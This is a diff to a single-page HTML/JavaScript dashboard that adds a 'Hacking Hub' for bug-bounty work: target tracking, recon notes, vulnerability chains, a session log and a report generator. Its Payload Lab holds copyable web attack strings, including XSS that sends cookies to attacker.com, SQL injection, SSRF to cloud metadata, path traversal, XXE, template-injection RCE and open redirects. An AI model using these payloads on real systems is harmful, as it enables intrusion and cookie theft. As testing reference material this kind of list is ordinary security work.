@@ -390,6 +390,125 @@ body{background:var(--bg);color:var(--tx);font-family:var(--sans);font-size:13px
 
 .dox-report{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);overflow:hidden;}
 .report-out{padding:11px 13px;font-family:var(--mono);font-size:11px;color:var(--tx2);white-space:pre-wrap;word-break:break-all;max-height:220px;overflow-y:auto;background:var(--bg);line-height:1.7;}
+
+/* ── HACKING HUB SHARED ── */
+.htabs{display:flex;gap:4px;padding:0 0 12px;border-bottom:1px solid var(--border);margin-bottom:14px;flex-wrap:wrap;}
+.htab{font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:var(--rs);border:1px solid var(--border);background:var(--overlay);color:var(--tx2);cursor:pointer;transition:all .15s;}
+.htab:hover{border-color:var(--rose);color:var(--rose);}
+.htab.act{background:var(--rb);border-color:var(--rose);color:var(--rose);}
+.h-sub{display:none;}.h-sub.act{display:block;}
+
+/* TARGET COMMAND CENTER */
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px;margin-bottom:14px;}
+.tcard{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);padding:12px 13px;cursor:default;}
+.tcard-head{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
+.tcard-ico{width:28px;height:28px;border-radius:var(--r);background:var(--rb);display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0;}
+.tcard-name{font-size:12px;font-weight:600;color:var(--tx);}
+.tcard-domain{font-family:var(--mono);font-size:10px;color:var(--tx3);}
+.tcard-tags{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;}
+.tst-scope{background:var(--cb);color:var(--cyan);font-family:var(--mono);font-size:9px;padding:1px 6px;border-radius:var(--rs);}
+.tst-status-active{background:var(--eb);color:var(--em);font-family:var(--mono);font-size:9px;padding:1px 6px;border-radius:var(--rs);}
+.tst-status-done{background:var(--overlay);color:var(--tx3);font-family:var(--mono);font-size:9px;padding:1px 6px;border-radius:var(--rs);}
+.tst-bug{background:var(--rb);color:var(--rose);font-family:var(--mono);font-size:9px;padding:1px 6px;border-radius:var(--rs);}
+.t-add-row{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap;}
+.t-add-row input,.t-add-row select{background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:5px 8px;font-size:12px;color:var(--tx);font-family:var(--sans);outline:none;}
+.t-add-row input:focus,.t-add-row select:focus{border-color:var(--rose);}
+.t-add-row input{flex:1;min-width:120px;}
+
+/* PAYLOAD LAB */
+.pcat-wrap{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;}
+.pcat{font-family:var(--mono);font-size:10px;padding:3px 9px;border-radius:var(--rs);border:1px solid var(--border);background:var(--overlay);color:var(--tx2);cursor:pointer;}
+.pcat:hover,.pcat.act{background:var(--rb);border-color:var(--rose);color:var(--rose);}
+.pl-cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:9px;}
+.pl-card{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);overflow:hidden;}
+.pl-card-head{padding:8px 11px;border-bottom:1px solid var(--border-s);display:flex;align-items:center;justify-content:space-between;}
+.pl-card-label{font-family:var(--mono);font-size:10px;font-weight:700;color:var(--rose);}
+.pl-code{font-family:var(--mono);font-size:11px;color:var(--tx);background:var(--bg);padding:8px 11px;white-space:pre;overflow-x:auto;line-height:1.6;}
+.pl-cp{background:transparent;border:1px solid var(--border);border-radius:var(--rs);padding:2px 8px;font-family:var(--mono);font-size:10px;color:var(--tx3);cursor:pointer;}
+.pl-cp:hover{border-color:var(--rose);color:var(--rose);}
+
+/* TOOL CHEATSHEET */
+.at-bar{display:flex;gap:6px;margin-bottom:12px;align-items:center;}
+.at-bar input{flex:1;background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:5px 9px;font-size:12px;color:var(--tx);outline:none;}
+.at-bar input:focus{border-color:var(--rose);}
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:9px;}
+.tcrd{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);overflow:hidden;}
+.tcrd-head{padding:8px 11px 6px;display:flex;align-items:center;gap:7px;}
+.tcrd-name{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--rose);}
+.tcrd-cat{font-family:var(--mono);font-size:9px;color:var(--tx3);margin-left:auto;}
+.tcrd-body{padding:0 11px 10px;}
+.tcmd{font-family:var(--mono);font-size:11px;color:var(--tx2);background:var(--bg);border-radius:var(--rs);padding:4px 7px;margin-bottom:4px;display:flex;align-items:flex-start;gap:6px;cursor:pointer;}
+.tcmd:hover{background:var(--overlay);color:var(--tx);}
+.tcmd-txt{flex:1;white-space:pre-wrap;word-break:break-all;line-height:1.5;}
+.tcmd-cp{font-size:9px;color:var(--tx3);flex-shrink:0;margin-top:2px;}
+
+/* RECON DASHBOARD */
+.recon-box{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);margin-bottom:12px;overflow:hidden;}
+.recon-add-row{display:flex;gap:6px;padding:10px 12px;border-bottom:1px solid var(--border);flex-wrap:wrap;align-items:center;}
+.recon-add-row input,.recon-add-row select{background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:4px 8px;font-size:12px;color:var(--tx);font-family:var(--sans);outline:none;}
+.recon-add-row input:focus,.recon-add-row select:focus{border-color:var(--rose);}
+.recon-add-row input{flex:1;min-width:140px;}
+.recon-item{padding:8px 12px;border-bottom:1px solid var(--border-s);display:flex;align-items:flex-start;gap:8px;}
+.recon-item:last-child{border-bottom:none;}
+.rtags{display:flex;gap:4px;flex-wrap:wrap;margin-top:4px;}
+.rtag{font-family:var(--mono);font-size:9px;padding:1px 5px;border-radius:var(--rs);background:var(--rb);color:var(--rose);}
+
+/* VULN CHAIN BUILDER */
+.chain-card{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);margin-bottom:10px;overflow:hidden;}
+.chain-head{padding:9px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;}
+.chain-name{font-size:12px;font-weight:600;color:var(--tx);}
+.chain-sev{font-family:var(--mono);font-size:9px;padding:2px 7px;border-radius:var(--rs);}
+.chain-steps{padding:8px 12px 4px;display:flex;flex-wrap:wrap;align-items:center;gap:4px;}
+.chain-step{font-family:var(--mono);font-size:10px;background:var(--rb);color:var(--rose);border-radius:var(--rs);padding:2px 8px;}
+.chain-arrow{color:var(--tx3);font-size:10px;}
+.chain-impact{padding:4px 12px 9px;font-size:11px;color:var(--tx2);}
+.chain-builder{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);padding:12px;}
+.chain-builder-row{display:flex;gap:6px;margin-bottom:7px;flex-wrap:wrap;}
+.chain-builder-row input,.chain-builder-row select{background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:4px 8px;font-size:12px;color:var(--tx);font-family:var(--sans);outline:none;}
+.chain-builder-row input:focus{border-color:var(--rose);}
+.chain-builder-row input{flex:1;min-width:120px;}
+.chain-steps-inp{display:flex;gap:5px;flex-wrap:wrap;align-items:center;padding:6px 0;}
+.chain-step-inp{font-family:var(--mono);font-size:11px;background:var(--rb);color:var(--rose);border-radius:var(--rs);padding:3px 8px;display:flex;align-items:center;gap:4px;}
+.chain-step-inp button{background:none;border:none;color:var(--rose);cursor:pointer;font-size:11px;line-height:1;}
+
+/* METHODOLOGY TRACKER */
+.meth-wrap{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px;}
+.meth-cat{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);overflow:hidden;}
+.meth-cat-head{padding:9px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.meth-cat-name{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--rose);}
+.meth-prog{font-family:var(--mono);font-size:10px;color:var(--tx3);}
+.meth-bar-wrap{height:3px;background:var(--overlay);margin:0 12px 8px;}
+.meth-bar{height:3px;background:var(--rose);border-radius:2px;transition:width .3s;}
+.meth-item{display:flex;align-items:center;gap:7px;padding:5px 12px;border-bottom:1px solid var(--border-s);cursor:pointer;}
+.meth-item:last-child{border-bottom:none;}
+.meth-item input[type=checkbox]{accent-color:var(--rose);width:13px;height:13px;cursor:pointer;flex-shrink:0;}
+.meth-item-label{font-size:11px;color:var(--tx);flex:1;}
+.meth-item.done .meth-item-label{text-decoration:line-through;color:var(--tx3);}
+
+/* SESSION LOGGER */
+.sess-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:9px;margin-bottom:12px;}
+.sess-card{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);padding:11px 13px;}
+.sess-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;}
+.sess-target{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--rose);}
+.sess-date{font-family:var(--mono);font-size:10px;color:var(--tx3);}
+.sess-notes-txt{font-size:12px;color:var(--tx2);line-height:1.6;word-break:break-word;}
+.sess-tags{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;}
+.sess-add{background:var(--raised);border:1px solid var(--border);border-radius:var(--rl);padding:12px;margin-bottom:12px;}
+.sess-add-row{display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap;}
+.sess-add-row input,.sess-add-row textarea{background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:5px 8px;font-size:12px;color:var(--tx);font-family:var(--sans);outline:none;}
+.sess-add-row input:focus,.sess-add-row textarea:focus{border-color:var(--rose);}
+.sess-add-row input{flex:1;min-width:120px;}
+.sess-add-row textarea{width:100%;resize:vertical;min-height:56px;}
+
+/* REPORT GENERATOR */
+.rp-shell{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+@media(max-width:700px){.rp-shell{grid-template-columns:1fr;}}
+.rp-form{display:flex;flex-direction:column;gap:7px;}
+.rp-form label{font-family:var(--mono);font-size:10px;color:var(--tx3);display:block;margin-bottom:2px;}
+.rp-form input,.rp-form textarea,.rp-form select{background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:5px 8px;font-size:12px;color:var(--tx);font-family:var(--sans);outline:none;width:100%;}
+.rp-form input:focus,.rp-form textarea:focus,.rp-form select:focus{border-color:var(--rose);}
+.rp-form textarea{resize:vertical;min-height:70px;}
+.rp-out{background:var(--bg);border:1px solid var(--border);border-radius:var(--rl);padding:12px 13px;font-family:var(--mono);font-size:11px;color:var(--tx2);white-space:pre-wrap;word-break:break-all;overflow-y:auto;max-height:540px;line-height:1.7;}
 </style>
 
 <div class="shell">
@@ -430,6 +549,17 @@ body{background:var(--bg);color:var(--tx);font-family:var(--sans);font-size:13px
       <div class="si" onclick="goto('scripts')"><span class="si-ico">⟨/⟩</span>Scripts Hub</div>
       <div class="si" onclick="goto('bugbounty')"><span class="si-ico">◈</span>Bug Bounty</div>
       <div class="si" onclick="goto('dox')"><span class="si-ico">◎</span>/DOX</div>
+    </div>
+    <div class="sb-grp">
+      <div class="sb-lbl">Hacking Hub</div>
+      <div class="si" onclick="goto('targets')"><span class="si-ico">◉</span>Targets</div>
+      <div class="si" onclick="goto('payloads')"><span class="si-ico">⟨/⟩</span>Payload Lab</div>
+      <div class="si" onclick="goto('recon')"><span class="si-ico">⌕</span>Recon</div>
+      <div class="si" onclick="goto('tools')"><span class="si-ico">▸</span>Tool Sheet</div>
+      <div class="si" onclick="goto('chains')"><span class="si-ico">◈</span>Vuln Chains</div>
+      <div class="si" onclick="goto('methodology')"><span class="si-ico">▦</span>Methodology</div>
+      <div class="si" onclick="goto('sessions')"><span class="si-ico">▪</span>Sessions</div>
+      <div class="si" onclick="goto('hackreport')"><span class="si-ico">≡</span>Report Gen</div>
     </div>
     <div class="sb-grp">
       <div class="sb-lbl">System</div>
@@ -928,6 +1058,157 @@ node index.js</code>
         </div>
       </div>
 
+      <!-- ── TARGETS ── -->
+      <div class="page" id="page-targets">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Target Command Center</span><button class="btn btn-g btn-sm" onclick="addTarget()">+ Add Target</button></div>
+          <div class="pb">
+            <div class="t-add-row" id="targetAddRow" style="display:none;">
+              <input id="t-name" placeholder="Target name / org">
+              <input id="t-domain" placeholder="domain.com">
+              <select id="t-scope"><option value="web">web</option><option value="api">api</option><option value="mobile">mobile</option><option value="network">network</option><option value="full">full scope</option></select>
+              <select id="t-status"><option value="active">active</option><option value="recon">recon</option><option value="done">done</option></select>
+              <button class="btn btn-sm" style="border:1px solid var(--rose);color:var(--rose);background:var(--rb);font-family:var(--mono);font-size:10px;" onclick="saveTarget()">Save</button>
+              <button class="btn btn-g btn-sm" onclick="cancelTarget()">Cancel</button>
+            </div>
+            <div class="tgrid" id="targetsGrid"></div>
+          </div>
+        </div>
+        <div class="panel">
+          <div class="ph"><span class="ph-t">Notes for Active Target</span></div>
+          <div class="pb"><textarea id="targetNotes" rows="5" style="width:100%;background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:8px;font-size:12px;color:var(--tx);font-family:var(--sans);outline:none;resize:vertical;" placeholder="Click a target to load notes…" oninput="saveTargetNote()"></textarea></div>
+        </div>
+      </div>
+
+      <!-- ── PAYLOAD LAB ── -->
+      <div class="page" id="page-payloads">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Payload Lab</span><span style="font-family:var(--mono);font-size:10px;color:var(--tx3);">click to copy</span></div>
+          <div class="pb">
+            <div class="pcat-wrap" id="plCats"></div>
+            <div class="pl-cards" id="plCards"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── RECON ── -->
+      <div class="page" id="page-recon">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Recon Dashboard</span><button class="btn btn-g btn-sm" onclick="addRecon()">+ Add</button></div>
+          <div class="pb">
+            <div class="recon-box">
+              <div class="recon-add-row" id="reconAddRow" style="display:none;">
+                <input id="r-target" placeholder="target.com">
+                <input id="r-data" placeholder="Finding / note…" style="flex:2">
+                <select id="r-type"><option value="subdomain">subdomain</option><option value="endpoint">endpoint</option><option value="tech">tech</option><option value="port">port</option><option value="cred">cred</option><option value="misc">misc</option></select>
+                <button class="btn btn-sm" style="border:1px solid var(--rose);color:var(--rose);background:var(--rb);font-family:var(--mono);font-size:10px;" onclick="saveRecon()">Save</button>
+                <button class="btn btn-g btn-sm" onclick="cancelRecon()">✕</button>
+              </div>
+              <div id="reconList"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── TOOL CHEATSHEET ── -->
+      <div class="page" id="page-tools">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Tool Cheatsheet</span></div>
+          <div class="pb">
+            <div class="at-bar"><input id="toolSearch" placeholder="Filter tools or commands…" oninput="filterTools()"></div>
+            <div class="tool-grid" id="toolGrid"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── VULN CHAINS ── -->
+      <div class="page" id="page-chains">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Vuln Chain Builder</span></div>
+          <div class="pb">
+            <div class="chain-builder mb" id="chainBuilderBox">
+              <div style="font-family:var(--mono);font-size:10px;color:var(--tx3);margin-bottom:8px;">NEW CHAIN</div>
+              <div class="chain-builder-row">
+                <input id="cn-name" placeholder="Chain name (e.g. SSRF → RCE)">
+                <input id="cn-target" placeholder="target.com">
+                <select id="cn-sev"><option value="critical">critical</option><option value="high">high</option><option value="medium">medium</option><option value="low">low</option></select>
+              </div>
+              <div class="chain-steps-inp" id="chainStepsInp"></div>
+              <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
+                <input id="cn-step" placeholder="Add step…" style="flex:1;background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:4px 8px;font-size:12px;color:var(--tx);outline:none;" onkeydown="if(event.key==='Enter')pushChainStep()">
+                <button class="btn btn-g btn-sm" onclick="pushChainStep()">+ Step</button>
+              </div>
+              <div style="margin-top:8px;">
+                <input id="cn-impact" placeholder="Impact / what this achieves…" style="width:100%;background:var(--overlay);border:1px solid var(--border);border-radius:var(--r);padding:5px 8px;font-size:12px;color:var(--tx);outline:none;margin-bottom:7px;">
+                <button class="btn btn-sm" style="border:1px solid var(--rose);color:var(--rose);background:var(--rb);font-family:var(--mono);font-size:10px;" onclick="saveChain()">Save Chain</button>
+              </div>
+            </div>
+            <div id="chainsList"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── METHODOLOGY ── -->
+      <div class="page" id="page-methodology">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Methodology Tracker</span><button class="btn btn-g btn-sm" onclick="resetMethodology()">Reset All</button></div>
+          <div class="pb"><div class="meth-wrap" id="methWrap"></div></div>
+        </div>
+      </div>
+
+      <!-- ── SESSIONS ── -->
+      <div class="page" id="page-sessions">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Session Logger</span><button class="btn btn-g btn-sm" onclick="toggleSessAdd()">+ New Session</button></div>
+          <div class="pb">
+            <div class="sess-add" id="sessAddBox" style="display:none;">
+              <div class="sess-add-row">
+                <input id="ss-target" placeholder="target.com">
+                <input id="ss-date" type="date">
+                <select id="ss-type"><option value="recon">recon</option><option value="exploit">exploit</option><option value="report">report</option><option value="follow-up">follow-up</option></select>
+              </div>
+              <div class="sess-add-row">
+                <textarea id="ss-notes" placeholder="Session notes, findings, commands used…"></textarea>
+              </div>
+              <div class="sess-add-row">
+                <input id="ss-tags" placeholder="#tags space separated">
+                <button class="btn btn-sm" style="border:1px solid var(--rose);color:var(--rose);background:var(--rb);font-family:var(--mono);font-size:10px;" onclick="saveSession()">Save</button>
+                <button class="btn btn-g btn-sm" onclick="toggleSessAdd()">Cancel</button>
+              </div>
+            </div>
+            <div class="sess-grid" id="sessGrid"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── REPORT GENERATOR ── -->
+      <div class="page" id="page-hackreport">
+        <div class="panel mb">
+          <div class="ph"><span class="ph-t">Report Generator</span><button class="btn btn-g btn-sm" onclick="copyHackReport()">Copy</button><button class="btn btn-g btn-sm" onclick="clearHackReport()">Clear</button></div>
+          <div class="pb">
+            <div class="rp-shell">
+              <div class="rp-form">
+                <div><label>Target / Program</label><input id="rp-target" placeholder="target.com / HackerOne program"></div>
+                <div><label>Vulnerability Title</label><input id="rp-title" placeholder="Stored XSS in profile bio"></div>
+                <div><label>Severity</label><select id="rp-sev"><option>Critical</option><option>High</option><option>Medium</option><option>Low</option><option>Informational</option></select></div>
+                <div><label>CVSS Score (optional)</label><input id="rp-cvss" placeholder="9.8"></div>
+                <div><label>Affected Endpoint</label><input id="rp-endpoint" placeholder="POST /api/profile/update"></div>
+                <div><label>Description</label><textarea id="rp-desc" placeholder="Describe the vulnerability…"></textarea></div>
+                <div><label>Steps to Reproduce</label><textarea id="rp-steps" placeholder="1. Login as user&#10;2. Navigate to…&#10;3. Insert payload…"></textarea></div>
+                <div><label>Impact</label><textarea id="rp-impact" placeholder="An attacker can…"></textarea></div>
+                <div><label>Proof of Concept / Payload</label><textarea id="rp-poc" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"></textarea></div>
+                <div><label>Remediation</label><textarea id="rp-fix" placeholder="Sanitize user input…"></textarea></div>
+                <button class="btn btn-sm" style="border:1px solid var(--rose);color:var(--rose);background:var(--rb);font-family:var(--mono);font-size:11px;margin-top:4px;" onclick="buildHackReport()">⬡ Generate Report</button>
+              </div>
+              <div>
+                <div style="font-family:var(--mono);font-size:10px;color:var(--tx3);margin-bottom:6px;">PREVIEW</div>
+                <div class="rp-out" id="rpOut">// Fill the form and click Generate Report…</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
     </div><!-- /content -->
   </div><!-- /main -->
 </div><!-- /shell -->
@@ -1254,7 +1535,7 @@ function handleCallError(e){
 }
 
 // ── NAV ──
-const TITLES={dashboard:'DASHBOARD',capture:'INBOX',notes:'NOTES',kanban:'PROJECTS',live:'ACTIVITY FEED',agents:'AGENTS',journal:'DAILY JOURNAL',focus:'FOCUS MODE',habits:'HABITS',scripts:'SCRIPTS HUB',bugbounty:'BUG BOUNTY',para:'PARA SYSTEM',setup:'MCP SETUP',dox:'/DOX — DEPARTMENT OF XIDENTITY'};
+const TITLES={dashboard:'DASHBOARD',capture:'INBOX',notes:'NOTES',kanban:'PROJECTS',live:'ACTIVITY FEED',agents:'AGENTS',journal:'DAILY JOURNAL',focus:'FOCUS MODE',habits:'HABITS',scripts:'SCRIPTS HUB',bugbounty:'BUG BOUNTY',para:'PARA SYSTEM',setup:'MCP SETUP',dox:'/DOX — DEPARTMENT OF XIDENTITY',targets:'HACKING HUB — TARGETS',payloads:'HACKING HUB — PAYLOAD LAB',recon:'HACKING HUB — RECON',tools:'HACKING HUB — TOOL CHEATSHEET',chains:'HACKING HUB — VULN CHAINS',methodology:'HACKING HUB — METHODOLOGY',sessions:'HACKING HUB — SESSIONS',hackreport:'HACKING HUB — REPORT GENERATOR'};
 function goto(p){
   document.querySelectorAll('.page').forEach(e=>e.classList.remove('active'));
   document.querySelectorAll('.si').forEach(e=>e.classList.remove('active'));
@@ -1275,6 +1556,14 @@ function render(p){
   if(p==='para')renderPARA();
   if(p==='setup')initMCP();
   if(p==='dox')renderDOX();
+  if(p==='targets')renderTargets();
+  if(p==='payloads')renderPayloads();
+  if(p==='recon')renderRecon();
+  if(p==='tools')renderTools();
+  if(p==='chains')renderChains();
+  if(p==='methodology')renderMethodology();
+  if(p==='sessions')renderSessions();
+  if(p==='hackreport'){}
   updateStats();
 }
 
@@ -1635,6 +1924,399 @@ function doxClear(){
 }
 
 function renderDOX(){renderFindings();}
+
+// ── HACKING HUB STATE ──
+let HH = JSON.parse(localStorage.getItem('xchackhub')||'null') || {
+  targets:[],
+  targetNotes:{},
+  recon:[],
+  chains:[],
+  chainStepsTemp:[],
+  methodology:{},
+  sessions:[],
+};
+const saveHH=()=>localStorage.setItem('xchackhub',JSON.stringify(HH));
+
+// ── TARGETS ──
+let activeTargetId=null;
+function renderTargets(){
+  const g=document.getElementById('targetsGrid');
+  g.innerHTML=HH.targets.length?HH.targets.map(t=>`
+    <div class="tcard" onclick="selectTarget(${t.id})" style="cursor:pointer;border-color:${activeTargetId===t.id?'var(--rose)':'var(--border)'}">
+      <div class="tcard-head">
+        <div class="tcard-ico">◉</div>
+        <div><div class="tcard-name">${esc(t.name)}</div><div class="tcard-domain">${esc(t.domain)}</div></div>
+        <button onclick="event.stopPropagation();delTarget(${t.id})" class="kdl" style="margin-left:auto;">✕</button>
+      </div>
+      <div class="tcard-tags">
+        <span class="tst-scope">${esc(t.scope)}</span>
+        <span class="tst-status-${t.status==='active'?'active':'done'}">${esc(t.status)}</span>
+        <span class="tst-bug">${(HH.recon.filter(r=>r.target===t.domain)).length} recon</span>
+      </div>
+    </div>`).join(''):'<div class="empty">No targets yet — add one above</div>';
+  if(activeTargetId){
+    document.getElementById('targetNotes').value=HH.targetNotes[activeTargetId]||'';
+  }
+}
+function addTarget(){const r=document.getElementById('targetAddRow');r.style.display=r.style.display==='none'?'flex':'none';}
+function cancelTarget(){document.getElementById('targetAddRow').style.display='none';}
+function saveTarget(){
+  const name=document.getElementById('t-name').value.trim();
+  const domain=document.getElementById('t-domain').value.trim();
+  if(!name&&!domain){toast('Enter name or domain');return;}
+  HH.targets.push({id:Date.now(),name:name||domain,domain:domain||name,scope:document.getElementById('t-scope').value,status:document.getElementById('t-status').value,date:td()});
+  document.getElementById('t-name').value='';document.getElementById('t-domain').value='';
+  document.getElementById('targetAddRow').style.display='none';
+  saveHH();renderTargets();toast('Target added');
+}
+function delTarget(id){HH.targets=HH.targets.filter(t=>t.id!==id);if(activeTargetId===id){activeTargetId=null;document.getElementById('targetNotes').value='';}saveHH();renderTargets();}
+function selectTarget(id){activeTargetId=id;document.getElementById('targetNotes').value=HH.targetNotes[id]||'';renderTargets();}
+function saveTargetNote(){if(!activeTargetId)return;HH.targetNotes[activeTargetId]=document.getElementById('targetNotes').value;saveHH();}
+
+// ── PAYLOAD LAB ──
+const PAYLOADS={
+  XSS:[
+    {label:'Basic Alert',code:`<script>alert(1)<\/script>`},
+    {label:'Img onerror',code:`<img src=x onerror=alert(1)>`},
+    {label:'SVG onload',code:`<svg onload=alert(1)>`},
+    {label:'Input autofocus',code:`<input autofocus onfocus=alert(1)>`},
+    {label:'JS URI',code:`javascript:alert(document.cookie)`},
+    {label:'Steal Cookie',code:`<script>fetch('https://attacker.com?c='+document.cookie)<\/script>`},
+    {label:'Polyglot',code:`jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e`},
+  ],
+  SQLi:[
+    {label:'Auth Bypass',code:`' OR '1'='1`},
+    {label:'Auth Bypass 2',code:`admin'--`},
+    {label:'Union 2col',code:`' UNION SELECT null,null--`},
+    {label:'Union DB name',code:`' UNION SELECT database(),null--`},
+    {label:'Boolean Blind',code:`' AND 1=1--`},
+    {label:'Time Blind (MySQL)',code:`'; WAITFOR DELAY '0:0:5'--`},
+    {label:'Error Based',code:`' AND extractvalue(1,concat(0x7e,database()))--`},
+  ],
+  SSRF:[
+    {label:'Localhost',code:`http://localhost/admin`},
+    {label:'127.0.0.1',code:`http://127.0.0.1:8080`},
+    {label:'AWS Metadata',code:`http://169.254.169.254/latest/meta-data/`},
+    {label:'GCP Metadata',code:`http://metadata.google.internal/computeMetadata/v1/`},
+    {label:'DNS Rebinding',code:`http://0x7f000001/`},
+    {label:'IPv6 Localhost',code:`http://[::1]/`},
+    {label:'File Read',code:`file:///etc/passwd`},
+  ],
+  IDOR:[
+    {label:'Param Fuzz',code:`GET /api/user?id=1337`},
+    {label:'UUID Replace',code:`GET /api/orders/550e8400-e29b-41d4-a716-446655440000`},
+    {label:'Mass Assign',code:`{"role":"admin","userId":2}`},
+    {label:'Ref Header',code:`Referer: https://target.com/admin`},
+    {label:'BOLA',code:`DELETE /api/v1/users/TARGET_ID`},
+  ],
+  PathTraversal:[
+    {label:'Unix basic',code:`../../../../etc/passwd`},
+    {label:'URL encoded',code:`%2e%2e%2f%2e%2e%2fetc%2fpasswd`},
+    {label:'Double encoded',code:`%252e%252e%252fetc%252fpasswd`},
+    {label:'Windows',code:`..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`},
+    {label:'Null byte',code:`../../etc/passwd%00.jpg`},
+  ],
+  XXE:[
+    {label:'File Read',code:`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`},
+    {label:'SSRF via XXE',code:`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>`},
+    {label:'Blind OOB',code:`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>`},
+  ],
+  SSTI:[
+    {label:'Jinja2 Test',code:`{{7*7}}`},
+    {label:'Jinja2 RCE',code:`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`},
+    {label:'Twig Test',code:`{{7*'7'}}`},
+    {label:'Freemarker',code:`<#assign ex="freemarker.template.utility.Execute"?new()>${r"${ex('id')}"}`},
+    {label:'EL Injection',code:`${"".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}`},
+  ],
+  OpenRedirect:[
+    {label:'Basic',code:`?next=https://evil.com`},
+    {label:'URL encoded',code:`?redirect=%68%74%74%70%73%3a%2f%2fevil.com`},
+    {label:'Protocol relative',code:`?url=//evil.com`},
+    {label:'JS URI',code:`?goto=javascript:alert(1)`},
+    {label:'Double slash',code:`?next=https:evil.com`},
+  ],
+};
+let activePayloadCat='XSS';
+function renderPayloads(){
+  const cats=Object.keys(PAYLOADS);
+  document.getElementById('plCats').innerHTML=cats.map(c=>`<span class="pcat${c===activePayloadCat?' act':''}" onclick="setPayloadCat('${c}')">${c}</span>`).join('');
+  const payloads=PAYLOADS[activePayloadCat]||[];
+  document.getElementById('plCards').innerHTML=payloads.map((p,i)=>`
+    <div class="pl-card">
+      <div class="pl-card-head">
+        <span class="pl-card-label">${esc(p.label)}</span>
+        <button class="pl-cp" id="plcp${i}" onclick="cpPayload(${i})">copy</button>
+      </div>
+      <div class="pl-code">${esc(p.code)}</div>
+    </div>`).join('');
+}
+function setPayloadCat(c){activePayloadCat=c;renderPayloads();}
+function cpPayload(i){
+  navigator.clipboard?.writeText(PAYLOADS[activePayloadCat][i].code);
+  const b=document.getElementById('plcp'+i);b.textContent='copied!';setTimeout(()=>b.textContent='copy',1800);
+  toast('Payload copied');
+}
+
+// ── RECON ──
+let reconAddOpen=false;
+function renderRecon(){
+  const list=HH.recon.slice().reverse();
+  document.getElementById('reconList').innerHTML=list.length?list.map(r=>`
+    <div class="recon-item">
+      <div style="flex:1">
+        <div style="display:flex;gap:6px;align-items:center;margin-bottom:3px;">
+          <span style="font-family:var(--mono);font-size:11px;font-weight:700;color:var(--rose);">${esc(r.target)}</span>
+          <span class="rtag">${esc(r.type)}</span>
+        </div>
+        <div style="font-size:12px;color:var(--tx2);word-break:break-all;">${esc(r.data)}</div>
+        <div style="font-family:var(--mono);font-size:10px;color:var(--tx3);margin-top:3px;">${ago(r.date)}</div>
+      </div>
+      <button onclick="delRecon(${r.id})" class="kdl">✕</button>
+    </div>`).join(''):'<div style="padding:14px 12px;color:var(--tx3);font-size:12px;">No recon data yet</div>';
+}
+function addRecon(){reconAddOpen=!reconAddOpen;document.getElementById('reconAddRow').style.display=reconAddOpen?'flex':'none';}
+function cancelRecon(){reconAddOpen=false;document.getElementById('reconAddRow').style.display='none';}
+function saveRecon(){
